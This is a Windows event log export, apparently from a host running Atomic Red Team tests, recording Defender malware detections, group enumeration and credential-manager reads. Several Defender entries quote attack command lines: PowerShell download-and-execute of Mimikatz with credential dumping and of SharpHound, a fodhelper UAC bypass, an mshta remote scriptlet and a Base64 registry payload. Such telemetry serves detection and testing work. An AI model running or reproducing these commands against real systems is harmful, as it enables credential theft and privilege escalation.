Level,Date and Time,Source,Event ID,Task Category,More Information
Information,15/04/2020 14:40,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.

Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x2E942

Group:
	Security ID:		BUILTIN\System Managed Group
	Group Name:		System Managed Accounts Group
	Group Domain:		Builtin

Process Information:
	Process ID:		0x130c
	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
Information,15/04/2020 14:40,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.

Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x2E942

Group:
	Security ID:		BUILTIN\Users
	Group Name:		Users
	Group Domain:		Builtin

Process Information:
	Process ID:		0x130c
	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
Information,15/04/2020 14:41,Service Control Manager,7040,None,The start type of the Background Intelligent Transfer Service service was changed from demand start to auto start.
Information,15/04/2020 14:41,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.

Subject:
	Security ID:		SYSTEM
	Account Name:		DESKTOP-P8HTU4V$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Group:
	Security ID:		BUILTIN\Administrators
	Group Name:		Administrators
	Group Domain:		Builtin

Process Information:
	Process ID:		0x1a0
	Process Name:		C:\Windows\System32\svchost.exe"
Information,15/04/2020 14:41,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.

Subject:
	Security ID:		SYSTEM
	Account Name:		DESKTOP-P8HTU4V$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Group:
	Security ID:		BUILTIN\Backup Operators
	Group Name:		Backup Operators
	Group Domain:		Builtin

Process Information:
	Process ID:		0x1a0
	Process Name:		C:\Windows\System32\svchost.exe"
Information,15/04/2020 14:41,Microsoft-Windows-Windows Defender,1117,None,"Windows Defender Antivirus has taken action to protect this machine from malware or other potentially unwanted software.
 For more information please see the following:
https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:PowerShell/Powersploit.M&threatid=2147725349&enterprise=0
 	Name: Trojan:PowerShell/Powersploit.M
 	ID: 2147725349
 	Severity: Severe
 	Category: Trojan
 	Path: file:_C:\AtomicRedTeam\atomics\T1056\src\Get-Keystrokes.ps1
 	Detection Origin: Local machine
 	Detection Type: Concrete
 	Detection Source: Real-Time Protection
 	User: NT AUTHORITY\SYSTEM
 	Process Name: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
 	Action: Quarantine
 	Action Status:  No additional actions required
 	Error Code: 0x00000000
 	Error description: The operation completed successfully. 
 	Security intelligence Version: AV: 1.313.1512.0, AS: 1.313.1512.0, NIS: 1.313.1512.0
 	Engine Version: AM: 1.1.16900.4, NIS: 1.1.16900.4"
Information,15/04/2020 14:41,SecurityCenter,15,None,Updated Windows Defender status successfully to SECURITY_PRODUCT_STATE_ON.
Information,15/04/2020 14:41,Microsoft-Windows-Security-Auditing,4624,Logon,"An account was successfully logged on.

Subject:
	Security ID:		SYSTEM
	Account Name:		DESKTOP-P8HTU4V$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Logon Information:
	Logon Type:		5
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		SYSTEM
	Account Name:		SYSTEM
	Account Domain:		NT AUTHORITY
	Logon ID:		0x3E7
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{00000000-0000-0000-0000-000000000000}

Process Information:
	Process ID:		0x258
	Process Name:		C:\Windows\System32\services.exe

Network Information:
	Workstation Name:	-
	Source Network Address:	-
	Source Port:		-

Detailed Authentication Information:
	Logon Process:		Advapi  
	Authentication Package:	Negotiate
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested."
Information,15/04/2020 14:41,Microsoft-Windows-Security-Auditing,4672,Special Logon,"Special privileges assigned to new logon.

Subject:
	Security ID:		SYSTEM
	Account Name:		SYSTEM
	Account Domain:		NT AUTHORITY
	Logon ID:		0x3E7

Privileges:		SeAssignPrimaryTokenPrivilege
			SeTcbPrivilege
			SeSecurityPrivilege
			SeTakeOwnershipPrivilege
			SeLoadDriverPrivilege
			SeBackupPrivilege
			SeRestorePrivilege
			SeDebugPrivilege
			SeAuditPrivilege
			SeSystemEnvironmentPrivilege
			SeImpersonatePrivilege
			SeDelegateSessionUserImpersonatePrivilege"
Warning,15/04/2020 14:42,Microsoft-Windows-Windows Defender,1116,None,"Windows Defender Antivirus has detected malware or other potentially unwanted software.
 For more information please see the following:
https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/Powessere.G&threatid=2147725444&enterprise=0
 	Name: Trojan:Win32/Powessere.G
 	ID: 2147725444
 	Severity: Severe
 	Category: Trojan
 	Path: CmdLine:_C:\Windows\System32\cmd.exe /c RUNDLL32 vbscript:PATH, RunHTMLApplication +String(CreateObject(WSCRIPT_SHELL).Run(CALCULATOR),0)
 	Detection Origin: Unknown
 	Detection Type: Concrete
 	Detection Source: System
 	User: NT AUTHORITY\SYSTEM
 	Process Name: Unknown
 	Security intelligence Version: AV: 1.313.1512.0, AS: 1.313.1512.0, NIS: 1.313.1512.0
 	Engine Version: AM: 1.1.16900.4, NIS: 1.1.16900.4"
Warning,15/04/2020 14:42,Microsoft-Windows-DistributedCOM,10016,None,"The machine-default permission settings do not grant Local Activation permission for the COM Server application with CLSID 
{C2F03A33-21F5-47FA-B4BB-156362A2F239}
 and APPID 
{316CDED5-E4AE-4B15-9113-7055D84DCC97}
 to the user DESKTOP-P8HTU4V\User SID (S-1-5-21-887719237-3143055800-1059174887-1001) from address LocalHost (Using LRPC) running in the application container Microsoft.Windows.ShellExperienceHost_10.0.18362.387_neutral_neutral_cw5n1h2txyewy SID (S-1-15-2-155514346-2573954481-755741238-1654018636-1233331829-3075935687-2861478708). This security permission can be modified using the Component Services administrative tool."
Warning,15/04/2020 14:42,Microsoft-Windows-Windows Defender,1116,None,"Windows Defender Antivirus has detected malware or other potentially unwanted software.
 For more information please see the following:
https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/Powessere.G&threatid=2147725444&enterprise=0
 	Name: Trojan:Win32/Powessere.G
 	ID: 2147725444
 	Severity: Severe
 	Category: Trojan
 	Path: CmdLine:_C:\Windows\System32\cmd.exe /c RUNDLL32 vbscript:PATH, RunHTMLApplication +String(CreateObject(WSCRIPT_SHELL).Run(CALCULATOR),0)
 	Detection Origin: Unknown
 	Detection Type: Concrete
 	Detection Source: System
 	User: NT AUTHORITY\SYSTEM
 	Process Name: Unknown
 	Security intelligence Version: AV: 1.313.1512.0, AS: 1.313.1512.0, NIS: 1.313.1512.0
 	Engine Version: AM: 1.1.16900.4, NIS: 1.1.16900.4"
Information,15/04/2020 14:42,SecurityCenter,15,None,Updated Windows Defender status successfully to SECURITY_PRODUCT_STATE_ON.
Warning,15/04/2020 14:42,Microsoft-Windows-Windows Defender,1116,None,"Windows Defender Antivirus has detected malware or other potentially unwanted software.
 For more information please see the following:
https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:PowerShell/Mimikatz.A&threatid=2147725502&enterprise=0
 	Name: Trojan:PowerShell/Mimikatz.A
 	ID: 2147725502
 	Severity: Severe
 	Category: Trojan
 	Path: CmdLine:_C:\Windows\System32\cmd.exe /c PWS_EXECUTABLE IEX (New-Object Net.WebClient).DownloadString('GITHUB_MIMIKATZ_PWS'); Invoke-Mimikatz -DumpCreds
 	Detection Origin: Unknown
 	Detection Type: Concrete
 	Detection Source: System
 	User: NT AUTHORITY\SYSTEM
 	Process Name: Unknown
 	Security intelligence Version: AV: 1.313.1512.0, AS: 1.313.1512.0, NIS: 1.313.1512.0
 	Engine Version: AM: 1.1.16900.4, NIS: 1.1.16900.4"
Warning,15/04/2020 14:42,Microsoft-Windows-DistributedCOM,10016,None,"The machine-default permission settings do not grant Local Activation permission for the COM Server application with CLSID 
{C2F03A33-21F5-47FA-B4BB-156362A2F239}
 and APPID 
{316CDED5-E4AE-4B15-9113-7055D84DCC97}
 to the user DESKTOP-P8HTU4V\User SID (S-1-5-21-887719237-3143055800-1059174887-1001) from address LocalHost (Using LRPC) running in the application container Microsoft.Windows.ShellExperienceHost_10.0.18362.387_neutral_neutral_cw5n1h2txyewy SID (S-1-15-2-155514346-2573954481-755741238-1654018636-1233331829-3075935687-2861478708). This security permission can be modified using the Component Services administrative tool."
Warning,15/04/2020 14:42,Microsoft-Windows-Windows Defender,1116,None,"Windows Defender Antivirus has detected malware or other potentially unwanted software.
 For more information please see the following:
https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:PowerShell/Sacepos.C&threatid=2147726248&enterprise=0
 	Name: Trojan:PowerShell/Sacepos.C
 	ID: 2147726248
 	Severity: Severe
 	Category: Trojan
 	Path: CmdLine:_C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe & {IEX (New-Object Net.WebClient).DownloadString('GITHUB_BLOODHOUNDAD_SHARPHOUND_PWS'); Invoke-BloodHound}
 	Detection Origin: Unknown
 	Detection Type: Concrete
 	Detection Source: System
 	User: NT AUTHORITY\SYSTEM
 	Process Name: Unknown
 	Security intelligence Version: AV: 1.313.1512.0, AS: 1.313.1512.0, NIS: 1.313.1512.0
 	Engine Version: AM: 1.1.16900.4, NIS: 1.1.16900.4"
Warning,15/04/2020 14:42,Microsoft-Windows-Windows Defender,1116,None,"Windows Defender Antivirus has detected malware or other potentially unwanted software.
 For more information please see the following:
https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:PowerShell/Mimikatz.A&threatid=2147725502&enterprise=0
 	Name: Trojan:PowerShell/Mimikatz.A
 	ID: 2147725502
 	Severity: Severe
 	Category: Trojan
 	Path: CmdLine:_C:\Windows\System32\cmd.exe /c PWS_EXECUTABLE IEX (New-Object Net.WebClient).DownloadString('GITHUB_MIMIKATZ_PWS'); Invoke-Mimikatz -DumpCreds
 	Detection Origin: Unknown
 	Detection Type: Concrete
 	Detection Source: System
 	User: NT AUTHORITY\SYSTEM
 	Process Name: Unknown
 	Security intelligence Version: AV: 1.313.1512.0, AS: 1.313.1512.0, NIS: 1.313.1512.0
 	Engine Version: AM: 1.1.16900.4, NIS: 1.1.16900.4"
Warning,15/04/2020 14:42,Microsoft-Windows-Windows Defender,1116,None,"Windows Defender Antivirus has detected malware or other potentially unwanted software.
 For more information please see the following:
https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:PowerShell/Sacepos.C&threatid=2147726248&enterprise=0
 	Name: Trojan:PowerShell/Sacepos.C
 	ID: 2147726248
 	Severity: Severe
 	Category: Trojan
 	Path: CmdLine:_C:\Windows\System32\cmd.exe /c PWS_EXECUTABLE IEX (New-Object Net.WebClient).DownloadString('GITHUB_INVOKE_APP_BYPASS_PWS'); Invoke-AppPathBypass -Payload 'C:\Windows\System32\cmd.exe'
 	Detection Origin: Unknown
 	Detection Type: Concrete
 	Detection Source: System
 	User: NT AUTHORITY\SYSTEM
 	Process Name: Unknown
 	Security intelligence Version: AV: 1.313.1512.0, AS: 1.313.1512.0, NIS: 1.313.1512.0
 	Engine Version: AM: 1.1.16900.4, NIS: 1.1.16900.4"
Warning,15/04/2020 14:42,Microsoft-Windows-Windows Defender,1116,None,"Windows Defender Antivirus has detected malware or other potentially unwanted software.
 For more information please see the following:
https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/Kovter.L&threatid=2147752413&enterprise=0
 	Name: Trojan:Win32/Kovter.L
 	ID: 2147752413
 	Severity: Severe
 	Category: Trojan
 	Path: CmdLine:_C:\Windows\System32\cmd.exe /c CMD_EXECUTABL /c MSHTA_EXECUTABLE javascript:a=GetObject('script:GITHUB_ATOMICS_T1086').Exec();close()
 	Detection Origin: Unknown
 	Detection Type: Concrete
 	Detection Source: System
 	User: NT AUTHORITY\SYSTEM
 	Process Name: Unknown
 	Security intelligence Version: AV: 1.313.1512.0, AS: 1.313.1512.0, NIS: 1.313.1512.0
 	Engine Version: AM: 1.1.16900.4, NIS: 1.1.16900.4"
Warning,15/04/2020 14:42,Microsoft-Windows-Windows Defender,1116,None,"Windows Defender Antivirus has detected malware or other potentially unwanted software.
 For more information please see the following:
https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/Powessere.K&threatid=2147734747&enterprise=0
 	Name: Trojan:Win32/Powessere.K
 	ID: 2147734747
 	Severity: Severe
 	Category: Trojan
 	Path: CmdLine:_C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe & {# Encoded payload in next command is the following ""Set-Content -path ""$env:ART-MAKER_TEXT"" -value ""Hello from the Atomic Red Team"""" REG_EXECUTABLE add ""HKEY_AtomicRedTeam"" /v ART /t REG_SZ /d ""HASH="" iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU_SOFTWARE).ART)))}
reg.exe add ""HKEY_CURRENT_USER\Software\Classes\AtomicRedTeam"" /v ART /t REG_SZ /d ""U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI=""
iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\AtomicRedTeam').ART)))}
 	Detection Origin: Unknown
 	Detection Type: Concrete
 	Detection Source: System
 	User: NT AUTHORITY\SYSTEM
 	Process Name: Unknown
 	Security intelligence Version: AV: 1.313.1512.0, AS: 1.313.1512.0, NIS: 1.313.1512.0
 	Engine Version: AM: 1.1.16900.4, NIS: 1.1.16900.4"
Information,15/04/2020 14:42,Microsoft-Windows-Security-Auditing,5379,User Account Management,"Credential Manager credentials were read.

Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x2E942
	Read Operation:		Enumerate Credentials

This event occurs when a user performs a read operation on stored credentials in Credential Manager."
Warning,15/04/2020 14:42,Microsoft-Windows-DistributedCOM,10016,None,"The machine-default permission settings do not grant Local Activation permission for the COM Server application with CLSID 
{C2F03A33-21F5-47FA-B4BB-156362A2F239}
 and APPID 
{316CDED5-E4AE-4B15-9113-7055D84DCC97}
 to the user DESKTOP-P8HTU4V\User SID (S-1-5-21-887719237-3143055800-1059174887-1001) from address LocalHost (Using LRPC) running in the application container Microsoft.Windows.ShellExperienceHost_10.0.18362.387_neutral_neutral_cw5n1h2txyewy SID (S-1-15-2-155514346-2573954481-755741238-1654018636-1233331829-3075935687-2861478708). This security permission can be modified using the Component Services administrative tool."
Information,15/04/2020 14:42,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.

Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x2E942

Group:
	Security ID:		BUILTIN\Users
	Group Name:		Users
	Group Domain:		Builtin

Process Information:
	Process ID:		0xc5c
	Process Name:		C:\Windows\System32\net1.exe"
Information,15/04/2020 14:42,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.

Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x2E942

Group:
	Security ID:		BUILTIN\Users
	Group Name:		Users
	Group Domain:		Builtin

Process Information:
	Process ID:		0x294
	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
Information,15/04/2020 14:42,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.

Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x2E942

Group:
	Security ID:		BUILTIN\Users
	Group Name:		Users
	Group Domain:		Builtin

Process Information:
	Process ID:		0x294
	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
Information,15/04/2020 14:42,Microsoft-Windows-Security-Auditing,5379,User Account Management,"Credential Manager credentials were read.

Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x2E942
	Read Operation:		Enumerate Credentials

This event occurs when a user performs a read operation on stored credentials in Credential Manager."
Information,15/04/2020 14:42,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.

Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x2E942

Group:
	Security ID:		BUILTIN\Access Control Assistance Operators
	Group Name:		Access Control Assistance Operators
	Group Domain:		Builtin

Process Information:
	Process ID:		0x294
	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
Information,15/04/2020 14:42,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.

Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x2E942

Group:
	Security ID:		BUILTIN\Administrators
	Group Name:		Administrators
	Group Domain:		Builtin

Process Information:
	Process ID:		0x294
	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
Information,15/04/2020 14:42,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.

Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x2E942

Group:
	Security ID:		BUILTIN\Backup Operators
	Group Name:		Backup Operators
	Group Domain:		Builtin

Process Information:
	Process ID:		0x294
	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
Information,15/04/2020 14:42,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.

Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x2E942

Group:
	Security ID:		BUILTIN\Cryptographic Operators
	Group Name:		Cryptographic Operators
	Group Domain:		Builtin

Process Information:
	Process ID:		0x294
	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
Information,15/04/2020 14:42,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.

Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x2E942

Group:
	Security ID:		BUILTIN\Device Owners
	Group Name:		Device Owners
	Group Domain:		Builtin

Process Information:
	Process ID:		0x294
	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
Information,15/04/2020 14:42,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.

Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x2E942

Group:
	Security ID:		BUILTIN\Distributed COM Users
	Group Name:		Distributed COM Users
	Group Domain:		Builtin

Process Information:
	Process ID:		0x294
	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
Information,15/04/2020 14:42,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.

Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x2E942

Group:
	Security ID:		BUILTIN\Event Log Readers
	Group Name:		Event Log Readers
	Group Domain:		Builtin

Process Information:
	Process ID:		0x294
	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
Information,15/04/2020 14:42,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.

Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x2E942

Group:
	Security ID:		BUILTIN\Guests
	Group Name:		Guests
	Group Domain:		Builtin

Process Information:
	Process ID:		0x294
	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
Information,15/04/2020 14:42,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.

Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x2E942

Group:
	Security ID:		BUILTIN\Hyper-V Administrators
	Group Name:		Hyper-V Administrators
	Group Domain:		Builtin

Process Information:
	Process ID:		0x294
	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
Information,15/04/2020 14:42,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.

Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x2E942

Group:
	Security ID:		BUILTIN\IIS_IUSRS
	Group Name:		IIS_IUSRS
	Group Domain:		Builtin

Process Information:
	Process ID:		0x294
	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
Information,15/04/2020 14:42,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.

Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x2E942

Group:
	Security ID:		BUILTIN\Network Configuration Operators
	Group Name:		Network Configuration Operators
	Group Domain:		Builtin

Process Information:
	Process ID:		0x294
	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
Information,15/04/2020 14:42,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.

Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x2E942

Group:
	Security ID:		BUILTIN\Performance Log Users
	Group Name:		Performance Log Users
	Group Domain:		Builtin

Process Information:
	Process ID:		0x294
	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
Information,15/04/2020 14:42,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.

Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x2E942

Group:
	Security ID:		BUILTIN\Performance Monitor Users
	Group Name:		Performance Monitor Users
	Group Domain:		Builtin

Process Information:
	Process ID:		0x294
	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
Information,15/04/2020 14:42,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.

Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x2E942

Group:
	Security ID:		BUILTIN\Power Users
	Group Name:		Power Users
	Group Domain:		Builtin

Process Information:
	Process ID:		0x294
	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
Information,15/04/2020 14:42,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.

Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x2E942

Group:
	Security ID:		BUILTIN\Remote Desktop Users
	Group Name:		Remote Desktop Users
	Group Domain:		Builtin

Process Information:
	Process ID:		0x294
	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
Information,15/04/2020 14:42,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.

Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x2E942

Group:
	Security ID:		BUILTIN\Remote Management Users
	Group Name:		Remote Management Users
	Group Domain:		Builtin

Process Information:
	Process ID:		0x294
	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
Information,15/04/2020 14:42,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.

Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x2E942

Group:
	Security ID:		BUILTIN\Replicator
	Group Name:		Replicator
	Group Domain:		Builtin

Process Information:
	Process ID:		0x294
	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
Information,15/04/2020 14:42,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.

Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x2E942

Group:
	Security ID:		BUILTIN\System Managed Group
	Group Name:		System Managed Accounts Group
	Group Domain:		Builtin

Process Information:
	Process ID:		0x294
	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
Information,15/04/2020 14:42,Microsoft-Windows-Security-Auditing,4799,Security Group Management,"A security-enabled local group membership was enumerated.

Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x2E942

Group:
	Security ID:		BUILTIN\Users
	Group Name:		Users
	Group Domain:		Builtin

Process Information:
	Process ID:		0x294
	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
Warning,15/04/2020 14:43,Microsoft-Windows-Windows Defender,1116,None,"Windows Defender Antivirus has detected malware or other potentially unwanted software.
 For more information please see the following:
https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/Sobocat.A&threatid=2147733729&enterprise=0
 	Name: Trojan:Win32/Sobocat.A
 	ID: 2147733729
 	Severity: Severe
 	Category: Trojan
 	Path: CmdLine:_C:\Windows\System32\cmd.exe /c REG_EXECUTABLE add HCU_SOFTWARE /ve /d CMD>EXE /f & reg.exe add HCU_SOFTWARE  /v DelegateExecute & FODHELPER_EXECUTABLE
 	Detection Origin: Unknown
 	Detection Type: Concrete
 	Detection Source: System
 	User: NT AUTHORITY\SYSTEM
 	Process Name: Unknown
 	Security intelligence Version: AV: 1.313.1512.0, AS: 1.313.1512.0, NIS: 1.313.1512.0
 	Engine Version: AM: 1.1.16900.4, NIS: 1.1.16900.4"
Information,15/04/2020 14:43,Service Control Manager,7040,None,The start type of the Background Intelligent Transfer Service service was changed from auto start to demand start.
